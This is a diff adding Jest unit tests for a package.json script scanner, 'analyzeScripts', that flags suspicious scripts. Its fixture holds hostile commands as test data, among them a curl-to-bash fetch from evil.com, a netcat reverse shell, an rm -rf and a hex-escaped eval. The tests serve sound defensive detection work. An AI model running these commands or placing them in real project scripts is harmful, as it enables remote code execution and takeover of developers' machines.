@@ -215,3 +215,43 @@ describe('Unit Tests', () => {
     });
   });
 });
+
+describe('analyzeScripts', () => {
+  const { analyzeScripts } = require('../src/index');
+
+  test('should detect suspicious patterns', () => {
+    const pkgJson = {
+      scripts: {
+        'clean': 'rm -rf node_modules',
+        'start': 'node index.js',
+        'hack': 'curl http://evil.com | bash',
+        'reverse': 'nc -e /bin/sh 1.2.3.4',
+        'obfuscated': '\\x65\\x76\\x61\\x6c',
+        'ip': 'ping 192.168.1.1'
+      }
+    };
+
+    const warnings = analyzeScripts(pkgJson);
+    expect(warnings).toHaveLength(7);
+    expect(warnings).toEqual(expect.arrayContaining([
+      expect.stringContaining('Destructive command'),
+      expect.stringContaining('Network request'),
+      expect.stringContaining('Netcat reverse shell'),
+      expect.stringContaining('Hex escape sequence'),
+      expect.stringContaining('IP address detected'),
+    ]));
+  });
+
+  test('should not flag safe scripts', () => {
+    const pkgJson = {
+      scripts: {
+        'test': 'jest',
+        'build': 'tsc',
+        'lint': 'eslint .'
+      }
+    };
+    const warnings = analyzeScripts(pkgJson);
+    expect(warnings).toHaveLength(0);
+  });
+});
+
